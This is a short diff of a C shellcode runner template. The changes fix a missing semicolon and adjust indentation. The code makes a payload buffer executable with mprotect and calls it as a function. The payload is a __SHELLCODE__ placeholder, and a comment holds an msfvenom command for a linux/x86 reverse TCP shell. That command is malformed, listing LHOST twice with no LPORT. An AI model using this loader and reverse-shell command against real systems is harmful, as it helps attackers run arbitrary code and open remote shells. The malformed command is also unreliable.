@@ -15,15 +15,15 @@ Reference:
 
 // handcrafted payload here
 // msfvenom -p linux/x86/shell/reverse_tcp LHOST=4444 LHOST=127.0.0.1 -f c
-unsigned char PAYLOAD[SCSSIZE] = __SHELLCODE__
+unsigned char PAYLOAD[SCSSIZE] = __SHELLCODE__;
 
 // msf template below
 //unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";
 
 int main(int argc, char *argv[]) {
 	// create executable memory
-  mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC|PROT_WRITE);  
-  int (*exeshell)() = (int (*)()) PAYLOAD;  
-  (int)(*exeshell)(); // execute shellcode	
+  	mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC|PROT_WRITE);  
+  	int (*exeshell)() = (int (*)()) PAYLOAD;  
+  	(int)(*exeshell)(); // execute shellcode	
 	return 0;
 }
